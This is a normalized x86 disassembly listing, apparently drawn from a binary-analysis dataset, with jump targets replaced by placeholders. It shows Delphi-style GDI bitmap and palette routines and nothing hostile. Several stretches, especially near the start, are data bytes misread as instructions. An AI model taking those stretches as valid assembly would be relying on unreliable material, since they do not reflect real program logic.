add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jae r-xdata
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
add [ eax + eax ] ah
add [ eax ] ch
cmp [ edx ] al
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
call sub_418cf8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_425968
test al al
je r-xdata
jae r-xdata
dec ecx
add al ch
lodsb [ esi ]
sbb al 0xff
dec [ ecx - 0x3fcc07bb ]
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_427476
push [ fs : eax ]
pop esi
retn
rcr ah 0x73
inc edx
add [ edi ] al
or eax 0x74694254
insd
popad
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4274a5
mov [ ebp - 0x4 ] eax
rcl [ ebp + 0x68 ] 0x9e
je r-xdata
jbe r-xdata
popad
outsb
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
popad
outsb
jbe r-xdata
xor eax eax
pop edx
xor [ ecx ] al
add [ eax ] al
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
add [ edi + edi * 8 + 0x30 ] ah
rcl [ ebp + 0x68 ] 0x76
je r-xdata
jae r-xdata
mov eax [ rw-data ]
call sub_419120
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_427590
add [ edi + edi * 8 + 0x30 ] ah
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebp + esi * 2 + 0x42 ] ah
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ eax ] ch
pop esp
inc edx
add [ esp + ebx * 2 ] dl
inc edx
add [ eax ] dh
jbe r-xdata
pushad
xor eax 0x35540040
inc eax
jae r-xdata
add [ eax + edi + 0x40042 ] dl
or [ edi + 0x72 ] al
popad
jo r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4259c4
retn
push ebp
push sub_42749e
push [ fs : eax ]
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4190bc
mov [ ebp - 0x8 ] eax
xor eax eax
sub_427400
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4190bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42749e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4274a5
mov eax [ rw-data ]
call sub_419120
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_427476
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_427590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4259c4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418cf8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_425968
test al al
je r-xdata
sub_4274ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4190bc
mov esi eax
xor ecx ecx
push ebp
push sub_42751c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419120
retn
mov edx ebx
mov eax esi
call sub_418cf8
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_427590
sub_427528
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42541c
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_427564
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_427590
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4254e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_427590
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_425720
xor edx edx
push ebp
push sub_427624
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_425b4c
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4190d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4259c4
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_427630
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_425720
xor eax eax
push ebp
push sub_42770f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42894c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4274ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428a4c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425b4c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_419034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4259c4
retn
sub_427720
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_40331c
sub_427740
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4274ac
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42779c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_423d70
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4274ac
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4274ac
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_4277e8
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_42664c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_427897
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4278a4
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4278f0
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4274ac
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425eb8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425eb8
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_427f3e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026ec
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_427c48
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_425da4
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_425eb8
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_425eb8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_425eb8
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_425eb8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_427eef
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_427ede
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_427ebc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_425eb8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4278a4
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_42664c
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_425300
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_41766c
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424640
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
call sub_424640
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_425e10
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427ec3
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425eb8
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_427e92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425eb8
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_40270c
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424640
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
call sub_424640
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424640
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
call sub_424640
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425eb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403b7c
call sub_403b7c
jmp r-xdata
sub_427ee5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427ef4
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403af8
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427f54
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_427fb8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4274ac
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4281b3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_425eb8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425eb8
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425eb8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42816b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4278f0
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4281c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_427020
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_42771c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42822c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_42893c
mov eax [ esi + 0x28 ]
call sub_427720
mov eax [ esi + 0x2c ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_428268
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_428320
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402d00
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_428bac
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_42771c
mov eax [ ebp - 0x4 ]
